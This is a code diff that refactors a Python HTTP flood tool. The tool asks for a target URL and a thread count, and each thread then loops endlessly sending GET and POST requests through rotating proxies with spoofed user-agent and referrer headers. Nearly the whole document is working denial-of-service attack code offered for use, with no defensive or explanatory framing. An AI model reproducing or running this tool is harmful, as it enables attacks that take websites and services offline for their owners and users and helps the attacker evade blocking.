@@ -1,73 +1,57 @@
-import requests, random, threading
+from requests   import request
+from threading  import Thread
+from random     import choice
 
-from data.theme   import C
-from data.proxies import DOWNLOAD
+from data.theme import C
+from data.spoof import PROXIES,USERAGENTS,REFERRERS
 
-DOWNLOAD()
 
-PROXIES     = open('data/proxies.txt').read().splitlines()
-USER_AGENTS = open('data/useragents.txt').read().splitlines()
-REFERRERS   = open('data/referrers.txt').read().splitlines()
-
-class NoSkid:
-
-    def __init__(self,url):
-        self.URL  = url
     
 
-    def flood_url(self):
-        while True:
-            try:
-                # choose a random proxy
-                proxy = random.choice(PROXIES)
-                
-                # send get request and close
-                r = requests.get(
-                    url     = self.URL, 
-                    headers = {'User-Agent': random.choice(USER_AGENTS), 'Referrer': random.choice(REFERRERS)},
+def flood_url(URL: str) -> None:
+    while True:
+        try:
+            #turn PROXIES into a list and choose a random one.
+            proxy = choice(list(PROXIES))
+            #send get request.
+            r = request(
+                method  = 'GET',
+                url     = URL, 
+                headers = {'User-Agent': choice(USERAGENTS), 'Referrer': choice(REFERRERS)},
+                proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
+            ); r.close()
+            print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
+            #send post request 10 times.
+            for _ in range(10):
+                r = request(
+                    method  = 'POST',
+                    url     = URL, 
+                    headers = {'User-Agent': choice(USERAGENTS), 'Referrer': choice(REFERRERS)},
                     proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
                 ); r.close()
                 print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
-                
-                for _ in range(10):
-                    # send post request and close
-                    r = requests.post(
-                        url     = self.URL, 
-                        headers = {'User-Agent': random.choice(USER_AGENTS), 'Referrer': random.choice(REFERRERS)},
-                        proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
-                    ); r.close()
-                    print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
-            except:
-                pass
-
-def main():
-    
-    # print out the banner
+        except:
+            pass
+            
+if __name__ == '__main__':
     print(C.banner)
-    
-    # print out the proxy count
     print(f'{C.white}Proxies: {C.lime}{len(PROXIES)}{C.white}\n')
     
-    url  = input(f'{C.white}URL:{C.cyan} ')
+    URL  = input(f'{C.white}URL:{C.cyan} ')
     
     while True:
         threads = int(input(f'{C.white}Threads (1-250):{C.cyan} '))
         
-        # no more than 250 threads
         if not threads > 251:
             break
             
-        # if a thread count was not found    
         if not threads:
             threads = 250 ; break
             
         print(f'{C.red}Thread limit is 100.{C.white}\n')
         
-    print(f'{C.white}Using {C.lime}{threads} {C.white}threads.')
-    session = NoSkid(url)
-    print(f'{C.white}Flooding {C.cyan}{url}{C.white}...\n')
+    print(f'{C.white}Using {C.lime}{threads} {C.white}threads.')    
+    print(f'{C.white}Flooding {C.cyan}{URL}{C.white} with {C.cyan}{len(PROXIES)} {C.white}proxies...\n')
     
     for _ in range(threads):
-        threading.Thread(target = session.flood_url).start()
-        
-main()        
+        Thread(target = flood_url, args = [URL]).start()
